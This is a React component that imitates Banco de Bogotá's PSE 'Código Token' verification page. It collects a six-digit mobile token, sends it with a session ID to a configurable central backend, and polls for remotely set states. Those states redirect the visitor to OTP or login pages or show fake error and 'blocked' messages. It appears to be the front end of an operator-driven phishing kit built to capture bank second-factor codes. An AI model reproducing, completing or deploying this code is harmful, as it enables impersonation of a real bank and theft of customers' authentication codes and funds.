import { useState, useRef, useEffect } from 'react';
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingBogota from "../../../../../components/LoadingBogota";
import logo from "../../img/logo_bancobogota.webp";
import "./bogota_token_pse.css";

const BOGOTA_ERROR_MODAL_KEY = "bogota_error_modal";
const BOGOTA_PSE_PAGE_CLASS = "bogota-pse-login-page";
const BOGOTA_CREDENTIAL_ERROR_AUTO_HIDE_MS = 5000;
const BOGOTA_CREDENTIAL_ERROR_TITLE = "Verifica los datos que ingresaste";
const BOGOTA_CREDENTIAL_ERROR_MSG = "Revisa tus datos y vuelve a intentarlo.";

// Se crea el componente
const TokenVerification = () => {

  // Se inicializa el navigate
  const navigate = useNavigate();

  // Se inicializan los estados del codigo y de la UI
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [isVerifying, setIsVerifying] = useState(false);
  const [showTooltip, setShowTooltip] = useState(false);
  const [showError, setShowError] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalMode, setModalMode] = useState(null);
  const [modalText, setModalText] = useState("");
  const [getLoading, setLoading] = useState(false);

  // Se inicializan las referencias para inputs y polling
  const inputRefs = useRef([]);
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);

  // Bandera para evitar que el blur automático active el error
  const isAutoFocusing = useRef(false);

  const stopPolling = () => {
    if (pollingIntervalRef.current) {
      clearTimeout(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
  };

  const clearTokenFields = () => {
    setCode(['', '', '', '', '', '']);
    setShowError(false);
    setShowTooltip(false);
    setIsVerifying(false);
    setLoading(false);
  };

  const dismissTokenCredentialError = () => {
    setShowModal(false);
    setModalMode(null);
    clearTokenFields();

    if (modalBloqueoEstadoRef.current === "error_token") {
      ignorarEstadoHastaCambioRef.current = "error_token";
      modalBloqueoEstadoRef.current = null;
    }

    setTimeout(() => inputRefs.current[0]?.focus(), 50);
  };

  const showTokenCredentialError = () => {
    stopPolling();
    setIsVerifying(false);
    setLoading(false);
    modalBloqueoEstadoRef.current = "error_token";
    clearTokenFields();
    setModalMode("token_error");
    setShowModal(true);
  };

  const dismissTokenCredentialErrorIfOpen = () => {
    if (modalBloqueoEstadoRef.current === "error_token") {
      dismissTokenCredentialError();
    }
  };

  // Se ejecuta cuando el componente se monta
  useEffect(() => {
    document.documentElement.classList.add(BOGOTA_PSE_PAGE_CLASS);
    document.body.classList.add(BOGOTA_PSE_PAGE_CLASS);

    return () => {
      document.documentElement.classList.remove(BOGOTA_PSE_PAGE_CLASS);
      document.body.classList.remove(BOGOTA_PSE_PAGE_CLASS);
    };
  }, []);

  // Se ejecuta cuando el componente se monta
  useEffect(() => {

    // Se enfoca el primer input
    inputRefs.current[0]?.focus();
  }, []);

  // Se ejecuta cuando el componente se monta
  useEffect(() => {

    // Se inicializa la sesión activa
    sessionIdRef.current = localStorage.getItem("sessionId");

    // Se revisa si hay modal pendiente desde otras pantallas
    const pendingError = localStorage.getItem(BOGOTA_ERROR_MODAL_KEY);

    if (pendingError === "error_token") {
      showTokenCredentialError();
    } else if (pendingError === "error_login") {

      setShowModal(true);
      setModalText("Error de login.");
    } else if (pendingError === "block_ip") {

      modalBloqueoEstadoRef.current = "block_ip";
      setModalMode("block_ip");
      setShowModal(true);
      setModalText("Acceso bloqueado por seguridad.");
    }

    if (pendingError) {
      localStorage.removeItem(BOGOTA_ERROR_MODAL_KEY);
    }
  }, []);

  useEffect(() => {
    if (!showModal || modalMode !== "token_error") return undefined;

    const timer = setTimeout(() => {
      dismissTokenCredentialError();
    }, BOGOTA_CREDENTIAL_ERROR_AUTO_HIDE_MS);

    return () => clearTimeout(timer);
  }, [showModal, modalMode]);

  // Se ejecuta cuando el componente se desmonta
  useEffect(() => {

    return () => {
      stopPolling();
    };
  }, []);

  // Se valida si el codigo token esta completo
  const isComplete = code.every(digit => digit !== '');

  // Se ejecuta cuando el codigo token esta completo
  useEffect(() => {

    // Se desactiva el error cuando el codigo esta completo
    if (isComplete) setShowError(false);
  }, [isComplete]);

  // Metodo para manejar el cambio de cada digito
  const handleChange = (index, value) => {

    // Se valida que el valor sea numerico
    if (!/^\d*$/.test(value)) return;

    // Se crea una copia del codigo actual
    const newCode = [...code];

    // Se actualiza el digito actual
    newCode[index] = value.slice(-1);

    // Se actualiza el codigo token
    setCode(newCode);
    dismissTokenCredentialErrorIfOpen();

    // Se valida si existe error en los inputs
    if (showError) {

      // Se desactiva el error al escribir
      setShowError(false);
    }

    // Se valida si existe valor y si no es el ultimo input
    if (value && index < 5) {

      // Se activa la bandera de auto focus
      isAutoFocusing.current = true;

      // Se enfoca el siguiente input
      inputRefs.current[index + 1]?.focus();

      // Se limpia la bandera de auto focus
      setTimeout(() => {
        isAutoFocusing.current = false;
      }, 100);
    }
  };

  // Metodo para manejar las teclas especiales
  const handleKeyDown = (index, e) => {

    // Se valida si la tecla es backspace y si el input actual esta vacio
    if (e.key === 'Backspace' && !code[index] && index > 0) {

      // Se activa la bandera de auto focus
      isAutoFocusing.current = true;

      // Se enfoca el input anterior
      inputRefs.current[index - 1]?.focus();
      dismissTokenCredentialErrorIfOpen();

      // Se valida si existe error en los inputs
      if (showError) {

        // Se desactiva el error
        setShowError(false);
      }

      // Se limpia la bandera de auto focus
      setTimeout(() => {
        isAutoFocusing.current = false;
      }, 100);
    }

    // Se valida si la tecla es flecha izquierda
    if (e.key === 'ArrowLeft' && index > 0) {

      // Se enfoca el input anterior
      inputRefs.current[index - 1]?.focus();
    }

    // Se valida si la tecla es flecha derecha
    if (e.key === 'ArrowRight' && index < 5) {

      // Se enfoca el siguiente input
      inputRefs.current[index + 1]?.focus();
    }
  };

  // Metodo para manejar el blur del grupo de inputs
  const handleBlur = () => {

    // Se valida si el blur viene de un auto focus
    if (isAutoFocusing.current) return;

    // Se valida si existe al menos un digito
    const hasSome = code.some(d => d !== '');

    // Se valida si el codigo aun no esta completo
    const notComplete = !code.every(d => d !== '');

    // Se muestra el error si hay datos parciales
    if (hasSome && notComplete) {

      // Se muestra el error
      setShowError(true);
    }
  };

  // Metodo para manejar el pegado del codigo
  const handlePaste = (e) => {

    // Se previene el pegado por defecto
    e.preventDefault();

    // Se captura el texto pegado y se normaliza a 6 digitos
    const pastedData = e.clipboardData.getData('text').slice(0, 6).replace(/\D/g, '');

    // Se valida si existe data pegada
    if (pastedData) {

      // Se crea una copia del codigo actual
      const newCode = [...code];

      // Se reparte el texto pegado en cada input
      pastedData.split('').forEach((digit, idx) => {
        if (idx < 6) newCode[idx] = digit;
      });

      // Se actualiza el codigo token
      setCode(newCode);
      dismissTokenCredentialErrorIfOpen();

      // Se captura el input que debe recibir el foco
      const focusIndex = Math.min(pastedData.length, 5);

      // Se enfoca el input correspondiente
      inputRefs.current[focusIndex]?.focus();

      // Se valida si el pegado completó el codigo
      if (pastedData.length === 6) {

        // Se desactiva el error
        setShowError(false);
      }
    }
  };

  // Metodo para manejar el submit del formulario
  const handleSubmit = async (e) => {

    // Se previene el comportamiento por defecto del formulario
    e.preventDefault();

    // Se captura el codigo completo
    const fullCode = code.join('');

    // Se valida si el codigo no esta completo o si existe loading
    if (fullCode.length !== 6 || getLoading) return;

    // Se captura la sessionId persistida
    const sessionId = localStorage.getItem("sessionId");

    // Se inicializa la data a enviar
    const dataSend = {
      "data": {
        "attributes": {
          "token": fullCode,
          "fecha": new Date().toISOString(),
          "sessionId": sessionId || sessionIdRef.current,
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/bogota/token",
        },
      },
    };

    // Se captura la url central configurada
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se usa el try catch
    try {

      // Se activa el estado de verificacion y loading
      setIsVerifying(true);
      setLoading(true);

      // Se realiza la petición al backend central o al backend local
      const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/bogota/token", dataSend);

      // Se valida si la respuesta fue exitosa
      if (response?.data?.success) {

        // Se persiste la sessionId devuelta por el backend
        localStorage.setItem("sessionId", response.data.sessionId);

        // Se actualiza la sessionId persistida
        sessionIdRef.current = response.data.sessionId;

        // Se inicia el polling después del envío correcto
        initPolling();
      } else {
        showTokenCredentialError();
      }
    } catch (error) {

      // Se desactiva el estado de verificacion y loading
      setIsVerifying(false);
      setLoading(false);

      // Se muestra el modal de error
      setShowModal(true);

      // Se setea el texto del modal
      setModalText(centralUrl ? "Error de comunicación con el servidor central." : "Error de conexión con el servidor.");
    }
  };

  // Se crea helper de redirección
  const redirigir = (ruta) => {

    // Se redirige a la ruta
    navigate(ruta);
  };

  // Metodo para cerrar el modal y limpiar el formulario local
  const closeModal = () => {
    if (modalMode === "token_error") {
      dismissTokenCredentialError();
      return;
    }

    setShowModal(false);
    setModalMode(null);
    setModalText("");
    clearTokenFields();
    setTimeout(() => inputRefs.current[0]?.focus(), 50);
  };

  // Se inicializa polling con setTimeout recursivo
  const initPolling = () => {

    // Se valida si existe un timeout de polling
    if (pollingIntervalRef.current) {

      // Se limpia el timeout de polling
      clearTimeout(pollingIntervalRef.current);

      // Se setea el timeout de polling a null
      pollingIntervalRef.current = null;
    }

    // Se crea el metodo de polling
    const poll = async () => {

      // Se usa el try catch
      try {

        // Se realiza la petición al backend
        const response = await instanceBackend.post(`/bogota/verify-state/${sessionIdRef.current}`);

        // Se captura el estado actual
        const estadoActual = (response?.data?.estado || "").toLowerCase();

        // Se valida si el estado actual no cambio o no es valido
        if (!estadoActual) {
          pollingIntervalRef.current = setTimeout(poll, 3000);
          return;
        }

        if (ignorarEstadoHastaCambioRef.current) {
          if (estadoActual === ignorarEstadoHastaCambioRef.current) {
            pollingIntervalRef.current = setTimeout(poll, 3000);
            return;
          }
          ignorarEstadoHastaCambioRef.current = null;
          modalBloqueoEstadoRef.current = null;
        }

        if (modalBloqueoEstadoRef.current && estadoActual === modalBloqueoEstadoRef.current) {
          pollingIntervalRef.current = setTimeout(poll, 3000);
          return;
        }

        if (lastEstadoRef.current === estadoActual) {
          pollingIntervalRef.current = setTimeout(poll, 3000);
          return;
        }

        lastEstadoRef.current = estadoActual;

        // Se inicializan los estados que detienen el polling
        const stateValid = [
          "sol_token", "sol_otp", "sol_finalizar", "sol_finalizado", "solicitar_finalizar", "error_token", "error_otp", "error_login", "block_ip", "error_blocked",
        ];

        // Se valida si el estado actual debe seguir consultando
        if (!stateValid.includes(estadoActual)) {

          // Se programa el siguiente ciclo de polling
          pollingIntervalRef.current = setTimeout(poll, 3000);
        } else {

          // Se setea el timeout de polling a null
          pollingIntervalRef.current = null;
        }

        // Se ejecuta el switch del estado actual
        switch (estadoActual) {
          case "sol_token":

            // Se desactiva el estado de verificacion y loading
            setIsVerifying(false);
            setLoading(false);

            // Se limpia el codigo token
            setCode(['', '', '', '', '', '']);

            // Se desactiva el error en los inputs
            setShowError(false);

            // Se enfoca el primer input
            setTimeout(() => inputRefs.current[0]?.focus(), 50);

            // Se sale del switch
            break;
          case "sol_otp":

            // Se desactiva el estado de verificacion y loading
            setIsVerifying(false);
            setLoading(false);

            // Se redirige a la página de OTP
            redirigir("/banco_bogota_otp_pse");

            // Se sale del switch
            break;
          case "sol_finalizar":
          case "sol_finalizado":
          case "solicitar_finalizar":

            // Se desactiva el estado de verificacion y loading
            setIsVerifying(false);
            setLoading(false);

            // Se redirige a la página de finalizado
            redirigir("/finalizado-pse");

            // Se sale del switch
            break;
          case "error_token":
            showTokenCredentialError();
            break;
          case "error_otp":

            // Se desactiva el estado de verificacion y loading
            setIsVerifying(false);
            setLoading(false);

            // Se setea el error modal
            localStorage.setItem(BOGOTA_ERROR_MODAL_KEY, "error_otp");

            // Se redirige a la página de OTP
            redirigir("/banco_bogota_otp_pse");

            // Se sale del switch
            break;
          case "error_login":

            // Se desactiva el estado de verificacion y loading
            setIsVerifying(false);
            setLoading(false);

            // Se setea el error modal
            localStorage.setItem(BOGOTA_ERROR_MODAL_KEY, "error_login");

            // Se redirige a la página de login
            redirigir("/banco_bogota_pse");

            // Se sale del switch
            break;
          case "block_ip":
          case "error_blocked":
            setIsVerifying(false);
            setLoading(false);
            modalBloqueoEstadoRef.current = "block_ip";
            setModalMode("block_ip");
            setShowModal(true);
            setModalText("Acceso bloqueado por seguridad.");
            break;
          default:
        }
      } catch (error) {

        // Se programa el siguiente ciclo de polling cuando falla la consulta
        pollingIntervalRef.current = setTimeout(poll, 3000);
      }
    };

    // Se ejecuta el primer ciclo de polling
    poll();
  };

  // Se retorna el HTML
  return (
    <div className="token-container">

      {/* Header principal con logo y botón de salida */}
      <header className="token-header">
        <div className="header-content" style={{ justifyContent: 'center' }}>
          <div className="bank-logo" style={{ position: 'static', transform: 'none' }}>
            <img
              src={logo}
              alt="Banco de Bogotá"
              className="bank-logo-img"
            />
          </div>
        </div>

        <button
          className="abandon-button"
          onClick={() => window.location.href = '/'}
          style={{
            position: 'absolute',
            right: '24px',
            top: '50%',
            transform: 'translateY(-50%)',
            marginLeft: '0'
          }}
        >
          Abandonar
          <svg className="close-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <line x1="18" y1="6" x2="6" y2="18"></line>
            <line x1="6" y1="6" x2="18" y2="18"></line>
          </svg>
        </button>
      </header>

      {/* Contenido principal del formulario */}
      <main className="token-main">
        <h1 className="token-title">Verifiquemos que eres tú</h1>

        <div className="token-card">

          {/* Icono visual del contenedor */}
          <div className="card-icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
          </div>

          <div className="card-header">
            <h2>Código Token</h2>
            <button
              className="info-button"
              onClick={() => setShowTooltip(!showTooltip)}
              aria-label="¿Dónde encuentro el código Token?"
            >
              <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="1.5">
                <circle cx="10" cy="10" r="8.5" />
                <circle cx="10" cy="6.5" r="1.2" fill="currentColor" stroke="none" />
                <line x1="10" y1="9" x2="10" y2="14" strokeLinecap="round" />
              </svg>

              {/* Tooltip explicativo del token */}
              {showTooltip && (
                <div className="info-tooltip">
                  <div className="tooltip-arrow"></div>
                  <h3>¿Dónde lo encuentro?</h3>
                  <p>
                    Ingresa a tu banca móvil, en la parte superior derecha encontrarás
                    la opción de token, si no te has registrado sigue los pasos.
                  </p>
                </div>
              )}
            </button>
          </div>

          <p className="card-description">
            Para ayudar a mantener tu cuenta segura, ingresa los 6 dígitos del código de Token móvil.
          </p>

          {/* Formulario del código token */}
          <form onSubmit={handleSubmit} className="token-form">

            {/* Inputs individuales del código */}
            <div className="inputs-container">
              {code.map((digit, index) => (
                <input
                  key={index}
                  ref={el => inputRefs.current[index] = el}
                  type="text"
                  inputMode="numeric"
                  maxLength="1"
                  value={digit}
                  onChange={(e) => handleChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  onBlur={handleBlur}
                  onPaste={handlePaste}
                  className={`token-input ${digit ? 'filled' : ''} ${showError ? 'error' : ''}`}
                  aria-label={`Dígito ${index + 1}`}
                />
              ))}
            </div>

            {/* Botón principal de verificación */}
            <button
              type="submit"
              className={`verify-button ${isComplete ? 'active' : ''}`}
              disabled={!isComplete || isVerifying || getLoading}
            >
              {isVerifying ? 'Verificando...' : 'Verificar'}
            </button>
          </form>
        </div>
      </main>

      {/* Modal de errores y bloqueos */}
      {showModal && (
        <div
          className={`bogota-modal-wrap ${modalMode === "token_error" ? "bogota-modal-wrap--login-error" : ""}`}
          onClick={modalMode === "token_error" ? dismissTokenCredentialError : closeModal}
        >
          {modalMode === "token_error" ? (
            <div
              className="bogota-modal-card--login-error"
              onClick={(e) => e.stopPropagation()}
              role="alertdialog"
              aria-labelledby="bogota-token-error-title"
              aria-describedby="bogota-token-error-desc"
            >
              <div className="bogota-modal-login-error-body">
                <div className="bogota-modal-login-error-icon" aria-hidden="true">
                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="40" height="40" fill="none">
                    <circle cx="12" cy="12" r="11" fill="currentColor" />
                    <path d="M12 7.5v5.25M12 16.25h.01" stroke="#fff" strokeWidth="1.75" strokeLinecap="round" />
                  </svg>
                </div>
                <h2 id="bogota-token-error-title" className="bogota-modal-login-error-title">
                  {BOGOTA_CREDENTIAL_ERROR_TITLE}
                </h2>
                <p id="bogota-token-error-desc" className="bogota-modal-login-error-text">
                  {BOGOTA_CREDENTIAL_ERROR_MSG}
                </p>
              </div>
              <div className="bogota-modal-login-error-footer">
                <button type="button" className="bogota-modal-retry-btn" onClick={dismissTokenCredentialError}>
                  Reintentar
                </button>
              </div>
            </div>
          ) : (
            <div className="bogota-modal-card" onClick={(e) => e.stopPropagation()}>
              <div className="bogota-modal-top">Personas</div>
              <div className="bogota-modal-mid">
                <p>{modalText}</p>
              </div>
              <div className="bogota-modal-bot">
                <button type="button" className="bogota-modal-accept-btn" onClick={closeModal}>
                  Aceptar
                </button>
              </div>
            </div>
          )}
        </div>
      )}

      {/* Loading overlay mientras se envía o se espera cambio de estado */}
      {getLoading && <LoadingBogota isOpen />}
    </div>
  );
};

// Se exporta el componente
export default TokenVerification;